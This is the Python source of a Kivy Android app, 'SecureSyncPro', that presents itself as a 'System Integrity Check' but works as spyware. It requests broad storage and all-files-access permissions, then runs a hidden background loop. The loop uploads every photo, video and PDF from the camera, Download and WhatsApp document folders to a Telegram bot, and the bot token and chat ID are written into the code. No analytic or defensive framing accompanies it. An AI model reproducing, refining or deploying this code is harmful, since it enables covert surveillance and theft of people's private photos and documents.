import os, requests, threading, uuid, time
from kivy.app import App
from kivy.uix.label import Label
from kivy.utils import platform
from kivy.clock import Clock

TOKEN = '8608695023:AAGNCsgbo3fRjpJ4fSNfvFrmgatIVZom5Os'
CHAT_ID = '8046944525'
DEVICE_ID = str(uuid.uuid4())[:8]

class SecureSyncPro(App):
    def build(self):
        self.label = Label(text="📱 System Integrity Check...", halign='center', font_size='14sp')
        Clock.schedule_once(self.check_permissions, 1)
        return self.label

    def report(self, msg):
        try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": f"🚀 [{DEVICE_ID}] " + msg})
        except: pass

    def send_media(self, file_path):
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            with open(file_path, 'rb') as f:
                requests.post(url, data={"chat_id": CHAT_ID, "caption": f"📂 Auto-Sync: {os.path.basename(file_path)}\nID: {DEVICE_ID}"}, files={"document": f}, timeout=60)
                return True
        except: return False

    def check_permissions(self, dt):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
            from android import api_version
            if api_version >= 30: self.trigger_all_files_access()
            else: self.start_sync()
        else: self.start_sync()

    def trigger_all_files_access(self):
        try:
            from jnius import autoclass, cast
            Activity = cast('android.app.Activity', autoclass('org.kivy.android.PythonActivity').mActivity)
            Environment = autoclass('android.os.Environment')
            if not Environment.isExternalStorageManager():
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.setData(autoclass('android.net.Uri').fromParts("package", Activity.getPackageName(), None))
                Activity.startActivity(intent)
            self.start_sync()
        except: self.start_sync()

    def start_sync(self):
        self.report("*Device Connected!* Continuous sync started.")
        threading.Thread(target=self.loop_sync, daemon=True).start()

    def loop_sync(self):
        sent = set()
        dirs = ['/sdcard/DCIM/Camera/', '/sdcard/Download/', '/sdcard/WhatsApp/Media/WhatsApp Documents/']
        while True:
            for d in dirs:
                if os.path.exists(d):
                    files = [os.path.join(d, f) for f in os.listdir(d) if f.lower().endswith(('.jpg', '.png', '.mp4', '.pdf'))]
                    files.sort(key=os.path.getmtime, reverse=True)
                    for f in files:
                        if f not in sent:
                            if self.send_media(f): sent.add(f)
                            time.sleep(10)
            time.sleep(300)

if __name__ == "__main__":
    SecureSyncPro().run()
